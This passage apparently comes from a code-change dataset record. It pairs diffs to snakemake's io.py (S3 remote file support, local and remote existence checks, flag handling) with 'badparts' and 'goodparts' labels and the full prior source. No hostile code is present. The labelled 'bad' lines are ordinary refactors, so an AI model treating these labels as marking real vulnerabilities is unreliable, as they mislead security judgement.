RemoteFileException, S3FileException","import snakemake.remote_providers.S3 as S3"]},{"diff":"\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n","add":45,"remove":3,"filename":"\/snakemake\/io.py","badparts":["    def protected(self):","        return self.exists and not os.access(self.file, os.W_OK)","        if not self.exists and lstat(self.file):"],"goodparts":["    @_referToRemote","    def exists_local(self):","        return os.path.exists(self.file)","    @property","    def exists_remote(self):","        return (self.is_remote and self.remote_object.exists())","    def protected(self):","        return self.exists_local and not os.access(self.file, os.W_OK)","    @property","    @_referToRemote","        return lstat(self.file).st_mtime","    @property","    def flags(self):","        return getattr(self._file, \"flags\", {})","    @property","    def mtime_local(self):","    @_referToRemote","    @property","    def size_local(self):","        self.check_broken_symlink()","        return os.path.getsize(self.file)","        if not self.exists_local and lstat(self.file):","    def download_from_remote(self):","        logger.info(\"Downloading from remote: {}\".format(self.file))","        if self.is_remote and self.remote_object.exists():","            self.remote_object.download()","        else:","            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")","    def upload_to_remote(self):","        logger.info(\"Uploading to remote: {}\".format(self.file))","        if self.is_remote and not self.remote_object.exists():","            self.remote_object.upload()","        else:","            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]},{"diff":"\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["    def touch(self):","            lutime(self.file, None)"],"goodparts":["    def touch(self, times=None):","        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"","            lutime(self.file, times)"]},{"diff":"\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n","add":12,"remove":2,"filename":"\/snakemake\/io.py","badparts":["        return IOFile(apply_wildcards(f, wildcards,","                      rule=self.rule)"],"goodparts":["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})","        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,","                                      rule=self.rule)","        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))","        return fileWithWildcardsApplied"]},{"diff":"\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n","add":9,"remove":1,"filename":"\/snakemake\/io.py","badparts":["        return flag in value.flags"],"goodparts":["        return flag in value.flags and value.flags[flag]","    if isinstance(value, _IOFile):","        return flag in value.flags and value.flags[flag]","def get_flag_value(value, flag_type):","    if isinstance(value, AnnotatedString):","        if flag_type in value.flags:","            return value.flags[flag_type]","        else:","            return None"]},{"diff":"\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n","add":1,"remove":1,"filename":"\/snakemake\/io.py","badparts":["    annotated = flag(value, \"dynamic\")"],"goodparts":["    annotated = flag(value, \"dynamic\", True)"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import stat import time import json from itertools import product, chain from collections import Iterable, namedtuple from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError from snakemake.logging import logger def lstat(f): return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks) def lutime(f, times): return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks) def lchmod(f, mode): return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks) def IOFile(file, rule=None): f=_IOFile(file) f.rule=rule return f class _IOFile(str): \"\"\" A file that is either input or output of a rule. \"\"\" dynamic_fill=\"__snakemake_dynamic__\" def __new__(cls, file): obj=str.__new__(cls, file) obj._is_function=type(file).__name__==\"function\" obj._file=file obj.rule=None obj._regex=None return obj @property def file(self): if not self._is_function: return self._file else: raise ValueError(\"This IOFile is specified as a function and \" \"may not be used directly.\") @property def exists(self): return os.path.exists(self.file) @property def protected(self): return self.exists and not os.access(self.file, os.W_OK) @property def mtime(self): return lstat(self.file).st_mtime @property def size(self): self.check_broken_symlink() return os.path.getsize(self.file) def check_broken_symlink(self): \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\" if not self.exists and lstat(self.file): raise WorkflowError(\"File{} seems to be a broken symlink.\".format(self.file)) def is_newer(self, time): return self.mtime > time def prepare(self): path_until_wildcard=re.split(self.dynamic_fill, self.file)[0] dir=os.path.dirname(path_until_wildcard) if len(dir) > 0 and not os.path.exists(dir): try: os.makedirs(dir) except OSError as e: if e.errno !=17: raise e def protect(self): mode=(lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~ stat.S_IWOTH) if os.path.isdir(self.file): for root, dirs, files in os.walk(self.file): for d in dirs: lchmod(os.path.join(self.file, d), mode) for f in files: lchmod(os.path.join(self.file, f), mode) else: lchmod(self.file, mode) def remove(self): remove(self.file) def touch(self): try: lutime(self.file, None) except OSError as e: if e.errno==2: raise MissingOutputException( \"Output file{} of rule{} shall be touched but \" \"does not exist.\".format(self.file, self.rule.name), lineno=self.rule.lineno, snakefile=self.rule.snakefile) else: raise e def touch_or_create(self): try: self.touch() except MissingOutputException: with open(self.file, \"w\") as f: pass def apply_wildcards(self, wildcards, fill_missing=False, fail_dynamic=False): f=self._file if self._is_function: f=self._file(Namedlist(fromdict=wildcards)) return IOFile(apply_wildcards(f, wildcards, fill_missing=fill_missing, fail_dynamic=fail_dynamic, dynamic_fill=self.dynamic_fill), rule=self.rule) def get_wildcard_names(self): return get_wildcard_names(self.file) def contains_wildcard(self): return contains_wildcard(self.file) def regex(self): if self._regex is None: self._regex=re.compile(regex(self.file)) return self._regex def constant_prefix(self): first_wildcard=_wildcard_regex.search(self.file) if first_wildcard: return self.file[:first_wildcard.start()] return self.file def match(self, target): return self.regex().match(target) or None def format_dynamic(self): return self.replace(self.dynamic_fill, \"{*}\") def __eq__(self, other): f=other._file if isinstance(other, _IOFile) else other return self._file==f def __hash__(self): return self._file.__hash__() _wildcard_regex=re.compile( \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\") def wait_for_files(files, latency_wait=3): \"\"\"Wait for given files to be present in filesystem.\"\"\" files=list(files) get_missing=lambda:[f for f in files if not os.path.exists(f)] missing=get_missing() if missing: logger.info(\"Waiting at most{} seconds for missing files.\".format( latency_wait)) for _ in range(latency_wait): if not get_missing(): return time.sleep(1) raise IOError(\"Missing files after{} seconds:\\n{}\".format( latency_wait, \"\\n\".join(get_missing()))) def get_wildcard_names(pattern): return set(match.group('name') for match in _wildcard_regex.finditer(pattern)) def contains_wildcard(path): return _wildcard_regex.search(path) is not None def remove(file): if os.path.exists(file): if os.path.isdir(file): try: os.removedirs(file) except OSError: pass else: os.remove(file) def regex(filepattern): f=[] last=0 wildcards=set() for match in _wildcard_regex.finditer(filepattern): f.append(re.escape(filepattern[last:match.start()])) wildcard=match.group(\"name\") if wildcard in wildcards: if match.group(\"constraint\"): raise ValueError( \"If multiple wildcards of the same name \" \"appear in a string, eventual constraints have to be defined \" \"at the first occurence and will be inherited by the others.\") f.append(\"(?P={})\".format(wildcard)) else: wildcards.add(wildcard) f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if match.group(\"constraint\") else \".+\")) last=match.end() f.append(re.escape(filepattern[last:])) f.append(\"$\") return \"\".join(f) def apply_wildcards(pattern, wildcards, fill_missing=False, fail_dynamic=False, dynamic_fill=None, keep_dynamic=False): def format_match(match): name=match.group(\"name\") try: value=wildcards[name] if fail_dynamic and value==dynamic_fill: raise WildcardError(name) return str(value) except KeyError as ex: if keep_dynamic: return \"{{{}}}\".format(name) elif fill_missing: return dynamic_fill else: raise WildcardError(str(ex)) return re.sub(_wildcard_regex, format_match, pattern) def not_iterable(value): return isinstance(value, str) or not isinstance(value, Iterable) class AnnotatedString(str): def __init__(self, value): self.flags=dict() def flag(value, flag_type, flag_value=True): if isinstance(value, AnnotatedString): value.flags[flag_type]=flag_value return value if not_iterable(value): value=AnnotatedString(value) value.flags[flag_type]=flag_value return value return[flag(v, flag_type, flag_value=flag_value) for v in value] def is_flagged(value, flag): if isinstance(value, AnnotatedString): return flag in value.flags return False def temp(value): \"\"\" A flag for an input or output file that shall be removed after usage. \"\"\" if is_flagged(value, \"protected\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"temp\") def temporary(value): \"\"\" An alias for temp. \"\"\" return temp(value) def protected(value): \"\"\" A flag for a file that shall be write protected after creation. \"\"\" if is_flagged(value, \"temp\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"protected\") def dynamic(value): \"\"\" A flag for a file that shall be dynamic, i.e. the multiplicity (and wildcard values) will be expanded after a certain rule has been run \"\"\" annotated=flag(value, \"dynamic\") tocheck=[annotated] if not_iterable(annotated) else annotated for file in tocheck: matches=list(_wildcard_regex.finditer(file)) for match in matches: if match.group(\"constraint\"): raise SyntaxError( \"The wildcards in dynamic files cannot be constrained.\") return annotated def touch(value): return flag(value, \"touch\") def expand(*args, **wildcards): \"\"\" Expand wildcards in given filepatterns. Arguments *args --first arg: filepatterns as list or one single filepattern, second arg(optional): a function to combine wildcard values (itertools.product per default) **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" filepatterns=args[0] if len(args)==1: combinator=product elif len(args)==2: combinator=args[1] if isinstance(filepatterns, str): filepatterns=[filepatterns] def flatten(wildcards): for wildcard, values in wildcards.items(): if isinstance(values, str) or not isinstance(values, Iterable): values=[values] yield[(wildcard, value) for value in values] try: return[filepattern.format(**comb) for comb in map(dict, combinator(*flatten(wildcards))) for filepattern in filepatterns] except KeyError as e: raise WildcardError(\"No values given for wildcard{}.\".format(e)) def limit(pattern, **wildcards): \"\"\" Limit wildcards to the given values. Arguments: **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" return pattern.format(**{ wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values)) for wildcard, values in wildcards.items() }) def glob_wildcards(pattern): \"\"\" Glob the values of the wildcards by matching the given pattern to the filesystem. Returns a named tuple with a list of values for each wildcard. \"\"\" pattern=os.path.normpath(pattern) first_wildcard=re.search(\"{[^{]\", pattern) dirname=os.path.dirname(pattern[:first_wildcard.start( )]) if first_wildcard else os.path.dirname(pattern) if not dirname: dirname=\".\" names=[match.group('name') for match in _wildcard_regex.finditer(pattern)] Wildcards=namedtuple(\"Wildcards\", names) wildcards=Wildcards(*[list() for name in names]) pattern=re.compile(regex(pattern)) for dirpath, dirnames, filenames in os.walk(dirname): for f in chain(filenames, dirnames): if dirpath !=\".\": f=os.path.join(dirpath, f) match=re.match(pattern, f) if match: for name, value in match.groupdict().items(): getattr(wildcards, name).append(value) return wildcards class Namedlist(list): \"\"\" A list that additionally provides functions to name items. Further, it is hashable, however the hash does not consider the item names. \"\"\" def __init__(self, toclone=None, fromdict=None, plainstr=False): \"\"\" Create the object. Arguments toclone --another Namedlist that shall be cloned fromdict --a dict that shall be converted to a Namedlist(keys become names) \"\"\" list.__init__(self) self._names=dict() if toclone: self.extend(map(str, toclone) if plainstr else toclone) if isinstance(toclone, Namedlist): self.take_names(toclone.get_names()) if fromdict: for key, item in fromdict.items(): self.append(item) self.add_name(key) def add_name(self, name): \"\"\" Add a name to the last item. Arguments name --a name \"\"\" self.set_name(name, len(self) -1) def set_name(self, name, index, end=None): \"\"\" Set the name of an item. Arguments name --a name index --the item index \"\"\" self._names[name]=(index, end) if end is None: setattr(self, name, self[index]) else: setattr(self, name, Namedlist(toclone=self[index:end])) def get_names(self): \"\"\" Get the defined names as(name, index) pairs. \"\"\" for name, index in self._names.items(): yield name, index def take_names(self, names): \"\"\" Take over the given names. Arguments names --the given names as(name, index) pairs \"\"\" for name,(i, j) in names: self.set_name(name, i, end=j) def items(self): for name in self._names: yield name, getattr(self, name) def allitems(self): next=0 for name, index in sorted(self._names.items(), key=lambda item: item[1][0]): start, end=index if end is None: end=start +1 if start > next: for item in self[next:start]: yield None, item yield name, getattr(self, name) next=end for item in self[next:]: yield None, item def insert_items(self, index, items): self[index:index +1]=items add=len(items) -1 for name,(i, j) in self._names.items(): if i > index: self._names[name]=(i +add, j +add) elif i==index: self.set_name(name, i, end=i +len(items)) def keys(self): return self._names def plainstrings(self): return self.__class__.__call__(toclone=self, plainstr=True) def __getitem__(self, key): try: return super().__getitem__(key) except TypeError: pass return getattr(self, key) def __hash__(self): return hash(tuple(self)) def __str__(self): return \" \".join(map(str, self)) class InputFiles(Namedlist): pass class OutputFiles(Namedlist): pass class Wildcards(Namedlist): pass class Params(Namedlist): pass class Resources(Namedlist): pass class Log(Namedlist): pass def _load_configfile(configpath): \"Tries to load a configfile first as JSON, then as YAML, into a dict.\" try: with open(configpath) as f: try: return json.load(f) except ValueError: f.seek(0) try: import yaml except ImportError: raise WorkflowError(\"Config file is not valid JSON and PyYAML \" \"has not been installed. Please install \" \"PyYAML to use YAML config files.\") try: return yaml.load(f) except yaml.YAMLError: raise WorkflowError(\"Config file is not valid JSON or YAML.\") except FileNotFoundError: raise WorkflowError(\"Config file{} not found.\".format(configpath)) def load_configfile(configpath): \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\" config=_load_configfile(configpath) if not isinstance(config, dict): raise WorkflowError(\"Config file must be given as JSON or YAML \" \"with keys at top level.\") return config class PeriodicityDetector: def __init__(self, min_repeat=50, max_repeat=100): \"\"\" Args: max_len(int): The maximum length of the periodic substring. \"\"\" self.regex=re.compile( \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format( min_repeat=min_repeat -1, max_repeat=max_repeat -1)) def is_periodic(self, value): \"\"\"Returns the periodic substring or None if not periodic.\"\"\" m=self.regex.search(value) if m is not None: return m.group(\"value\") ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport stat\nimport time\nimport json\nfrom itertools import product, chain\nfrom collections import Iterable, namedtuple\nfrom snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\nfrom snakemake.logging import logger\n\n\ndef lstat(f):\n    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n\n\ndef lutime(f, times):\n    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)\n\n\ndef lchmod(f, mode):\n    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)\n\n\ndef IOFile(file, rule=None):\n    f = _IOFile(file)\n    f.rule = rule\n    return f\n\n\nclass _IOFile(str):\n    \"\"\"\n    A file that is either input or output of a rule.\n    \"\"\"\n\n    dynamic_fill = \"__snakemake_dynamic__\"\n\n    def __new__(cls, file):\n        obj = str.__new__(cls, file)\n        obj._is_function = type(file).__name__ == \"function\"\n        obj._file = file\n        obj.rule = None\n        obj._regex = None\n        return obj\n\n    @property\n    def file(self):\n        if not self._is_function:\n            return self._file\n        else:\n            raise ValueError(\"This IOFile is specified as a function and \"\n                             \"may not be used directly.\")\n\n    @property\n    def exists(self):\n        return os.path.exists(self.file)\n\n    @property\n    def protected(self):\n        return self.exists and not os.access(self.file, os.W_OK)\n\n    @property\n    def mtime(self):\n        # do not follow symlinks for modification time\n        return lstat(self.file).st_mtime\n\n    @property\n    def size(self):\n        # follow symlinks but throw error if invalid\n        self.check_broken_symlink()\n        return os.path.getsize(self.file)\n\n    def check_broken_symlink(self):\n        \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n        if not self.exists and lstat(self.file):\n            raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n\n    def is_newer(self, time):\n        return self.mtime > time\n\n    def prepare(self):\n        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n        dir = os.path.dirname(path_until_wildcard)\n        if len(dir) > 0 and not os.path.exists(dir):\n            try:\n                os.makedirs(dir)\n            except OSError as e:\n                # ignore Errno 17 \"File exists\" (reason: multiprocessing)\n                if e.errno != 17:\n                    raise e\n\n    def protect(self):\n        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~\n                stat.S_IWOTH)\n        if os.path.isdir(self.file):\n            for root, dirs, files in os.walk(self.file):\n                for d in dirs:\n                    lchmod(os.path.join(self.file, d), mode)\n                for f in files:\n                    lchmod(os.path.join(self.file, f), mode)\n        else:\n            lchmod(self.file, mode)\n\n    def remove(self):\n        remove(self.file)\n\n    def touch(self):\n        try:\n            lutime(self.file, None)\n        except OSError as e:\n            if e.errno == 2:\n                raise MissingOutputException(\n                    \"Output file {} of rule {} shall be touched but \"\n                    \"does not exist.\".format(self.file, self.rule.name),\n                    lineno=self.rule.lineno,\n                    snakefile=self.rule.snakefile)\n            else:\n                raise e\n\n    def touch_or_create(self):\n        try:\n            self.touch()\n        except MissingOutputException:\n            # create empty file\n            with open(self.file, \"w\") as f:\n                pass\n\n    def apply_wildcards(self, wildcards,\n                        fill_missing=False,\n                        fail_dynamic=False):\n        f = self._file\n        if self._is_function:\n            f = self._file(Namedlist(fromdict=wildcards))\n\n        return IOFile(apply_wildcards(f, wildcards,\n                                      fill_missing=fill_missing,\n                                      fail_dynamic=fail_dynamic,\n                                      dynamic_fill=self.dynamic_fill),\n                      rule=self.rule)\n\n    def get_wildcard_names(self):\n        return get_wildcard_names(self.file)\n\n    def contains_wildcard(self):\n        return contains_wildcard(self.file)\n\n    def regex(self):\n        if self._regex is None:\n            # compile a regular expression\n            self._regex = re.compile(regex(self.file))\n        return self._regex\n\n    def constant_prefix(self):\n        first_wildcard = _wildcard_regex.search(self.file)\n        if first_wildcard:\n            return self.file[:first_wildcard.start()]\n        return self.file\n\n    def match(self, target):\n        return self.regex().match(target) or None\n\n    def format_dynamic(self):\n        return self.replace(self.dynamic_fill, \"{*}\")\n\n    def __eq__(self, other):\n        f = other._file if isinstance(other, _IOFile) else other\n        return self._file == f\n\n    def __hash__(self):\n        return self._file.__hash__()\n\n\n_wildcard_regex = re.compile(\n    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\")\n\n#    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>[^\\}]*))?\\s*\\}\")\n\n\ndef wait_for_files(files, latency_wait=3):\n    \"\"\"Wait for given files to be present in filesystem.\"\"\"\n    files = list(files)\n    get_missing = lambda: [f for f in files if not os.path.exists(f)]\n    missing = get_missing()\n    if missing:\n        logger.info(\"Waiting at most {} seconds for missing files.\".format(\n            latency_wait))\n        for _ in range(latency_wait):\n            if not get_missing():\n                return\n            time.sleep(1)\n        raise IOError(\"Missing files after {} seconds:\\n{}\".format(\n            latency_wait, \"\\n\".join(get_missing())))\n\n\ndef get_wildcard_names(pattern):\n    return set(match.group('name')\n               for match in _wildcard_regex.finditer(pattern))\n\n\ndef contains_wildcard(path):\n    return _wildcard_regex.search(path) is not None\n\n\ndef remove(file):\n    if os.path.exists(file):\n        if os.path.isdir(file):\n            try:\n                os.removedirs(file)\n            except OSError:\n                # ignore non empty directories\n                pass\n        else:\n            os.remove(file)\n\n\ndef regex(filepattern):\n    f = []\n    last = 0\n    wildcards = set()\n    for match in _wildcard_regex.finditer(filepattern):\n        f.append(re.escape(filepattern[last:match.start()]))\n        wildcard = match.group(\"name\")\n        if wildcard in wildcards:\n            if match.group(\"constraint\"):\n                raise ValueError(\n                    \"If multiple wildcards of the same name \"\n                    \"appear in a string, eventual constraints have to be defined \"\n                    \"at the first occurence and will be inherited by the others.\")\n            f.append(\"(?P={})\".format(wildcard))\n        else:\n            wildcards.add(wildcard)\n            f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if\n                                         match.group(\"constraint\") else \".+\"))\n        last = match.end()\n    f.append(re.escape(filepattern[last:]))\n    f.append(\"$\")  # ensure that the match spans the whole file\n    return \"\".join(f)\n\n\ndef apply_wildcards(pattern, wildcards,\n                    fill_missing=False,\n                    fail_dynamic=False,\n                    dynamic_fill=None,\n                    keep_dynamic=False):\n    def format_match(match):\n        name = match.group(\"name\")\n        try:\n            value = wildcards[name]\n            if fail_dynamic and value == dynamic_fill:\n                raise WildcardError(name)\n            return str(value)  # convert anything into a str\n        except KeyError as ex:\n            if keep_dynamic:\n                return \"{{{}}}\".format(name)\n            elif fill_missing:\n                return dynamic_fill\n            else:\n                raise WildcardError(str(ex))\n\n    return re.sub(_wildcard_regex, format_match, pattern)\n\n\ndef not_iterable(value):\n    return isinstance(value, str) or not isinstance(value, Iterable)\n\n\nclass AnnotatedString(str):\n    def __init__(self, value):\n        self.flags = dict()\n\n\ndef flag(value, flag_type, flag_value=True):\n    if isinstance(value, AnnotatedString):\n        value.flags[flag_type] = flag_value\n        return value\n    if not_iterable(value):\n        value = AnnotatedString(value)\n        value.flags[flag_type] = flag_value\n        return value\n    return [flag(v, flag_type, flag_value=flag_value) for v in value]\n\n\ndef is_flagged(value, flag):\n    if isinstance(value, AnnotatedString):\n        return flag in value.flags\n    return False\n\n\ndef temp(value):\n    \"\"\"\n    A flag for an input or output file that shall be removed after usage.\n    \"\"\"\n    if is_flagged(value, \"protected\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"temp\")\n\n\ndef temporary(value):\n    \"\"\" An alias for temp. \"\"\"\n    return temp(value)\n\n\ndef protected(value):\n    \"\"\" A flag for a file that shall be write protected after creation. \"\"\"\n    if is_flagged(value, \"temp\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"protected\")\n\n\ndef dynamic(value):\n    \"\"\"\n    A flag for a file that shall be dynamic, i.e. the multiplicity\n    (and wildcard values) will be expanded after a certain\n    rule has been run \"\"\"\n    annotated = flag(value, \"dynamic\")\n    tocheck = [annotated] if not_iterable(annotated) else annotated\n    for file in tocheck:\n        matches = list(_wildcard_regex.finditer(file))\n        #if len(matches) != 1:\n        #    raise SyntaxError(\"Dynamic files need exactly one wildcard.\")\n        for match in matches:\n            if match.group(\"constraint\"):\n                raise SyntaxError(\n                    \"The wildcards in dynamic files cannot be constrained.\")\n    return annotated\n\n\ndef touch(value):\n    return flag(value, \"touch\")\n\n\ndef expand(*args, **wildcards):\n    \"\"\"\n    Expand wildcards in given filepatterns.\n\n    Arguments\n    *args -- first arg: filepatterns as list or one single filepattern,\n        second arg (optional): a function to combine wildcard values\n        (itertools.product per default)\n    **wildcards -- the wildcards as keyword arguments\n        with their values as lists\n    \"\"\"\n    filepatterns = args[0]\n    if len(args) == 1:\n        combinator = product\n    elif len(args) == 2:\n        combinator = args[1]\n    if isinstance(filepatterns, str):\n        filepatterns = [filepatterns]\n\n    def flatten(wildcards):\n        for wildcard, values in wildcards.items():\n            if isinstance(values, str) or not isinstance(values, Iterable):\n                values = [values]\n            yield [(wildcard, value) for value in values]\n\n    try:\n        return [filepattern.format(**comb)\n                for comb in map(dict, combinator(*flatten(wildcards))) for\n                filepattern in filepatterns]\n    except KeyError as e:\n        raise WildcardError(\"No values given for wildcard {}.\".format(e))\n\n\ndef limit(pattern, **wildcards):\n    \"\"\"\n    Limit wildcards to the given values.\n\n    Arguments:\n    **wildcards -- the wildcards as keyword arguments\n                   with their values as lists\n    \"\"\"\n    return pattern.format(**{\n        wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values))\n        for wildcard, values in wildcards.items()\n    })\n\n\ndef glob_wildcards(pattern):\n    \"\"\"\n    Glob the values of the wildcards by matching the given pattern to the filesystem.\n    Returns a named tuple with a list of values for each wildcard.\n    \"\"\"\n    pattern = os.path.normpath(pattern)\n    first_wildcard = re.search(\"{[^{]\", pattern)\n    dirname = os.path.dirname(pattern[:first_wildcard.start(\n    )]) if first_wildcard else os.path.dirname(pattern)\n    if not dirname:\n        dirname = \".\"\n\n    names = [match.group('name')\n             for match in _wildcard_regex.finditer(pattern)]\n    Wildcards = namedtuple(\"Wildcards\", names)\n    wildcards = Wildcards(*[list() for name in names])\n\n    pattern = re.compile(regex(pattern))\n    for dirpath, dirnames, filenames in os.walk(dirname):\n        for f in chain(filenames, dirnames):\n            if dirpath != \".\":\n                f = os.path.join(dirpath, f)\n            match = re.match(pattern, f)\n            if match:\n                for name, value in match.groupdict().items():\n                    getattr(wildcards, name).append(value)\n    return wildcards\n\n\n# TODO rewrite Namedlist!\nclass Namedlist(list):\n    \"\"\"\n    A list that additionally provides functions to name items. Further,\n    it is hashable, however the hash does not consider the item names.\n    \"\"\"\n\n    def __init__(self, toclone=None, fromdict=None, plainstr=False):\n        \"\"\"\n        Create the object.\n\n        Arguments\n        toclone  -- another Namedlist that shall be cloned\n        fromdict -- a dict that shall be converted to a\n            Namedlist (keys become names)\n        \"\"\"\n        list.__init__(self)\n        self._names = dict()\n\n        if toclone:\n            self.extend(map(str, toclone) if plainstr else toclone)\n            if isinstance(toclone, Namedlist):\n                self.take_names(toclone.get_names())\n        if fromdict:\n            for key, item in fromdict.items():\n                self.append(item)\n                self.add_name(key)\n\n    def add_name(self, name):\n        \"\"\"\n        Add a name to the last item.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        self.set_name(name, len(self) - 1)\n\n    def set_name(self, name, index, end=None):\n        \"\"\"\n        Set the name of an item.\n\n        Arguments\n        name  -- a name\n        index -- the item index\n        \"\"\"\n        self._names[name] = (index, end)\n        if end is None:\n            setattr(self, name, self[index])\n        else:\n            setattr(self, name, Namedlist(toclone=self[index:end]))\n\n    def get_names(self):\n        \"\"\"\n        Get the defined names as (name, index) pairs.\n        \"\"\"\n        for name, index in self._names.items():\n            yield name, index\n\n    def take_names(self, names):\n        \"\"\"\n        Take over the given names.\n\n        Arguments\n        names -- the given names as (name, index) pairs\n        \"\"\"\n        for name, (i, j) in names:\n            self.set_name(name, i, end=j)\n\n    def items(self):\n        for name in self._names:\n            yield name, getattr(self, name)\n\n    def allitems(self):\n        next = 0\n        for name, index in sorted(self._names.items(),\n                                  key=lambda item: item[1][0]):\n            start, end = index\n            if end is None:\n                end = start + 1\n            if start > next:\n                for item in self[next:start]:\n                    yield None, item\n            yield name, getattr(self, name)\n            next = end\n        for item in self[next:]:\n            yield None, item\n\n    def insert_items(self, index, items):\n        self[index:index + 1] = items\n        add = len(items) - 1\n        for name, (i, j) in self._names.items():\n            if i > index:\n                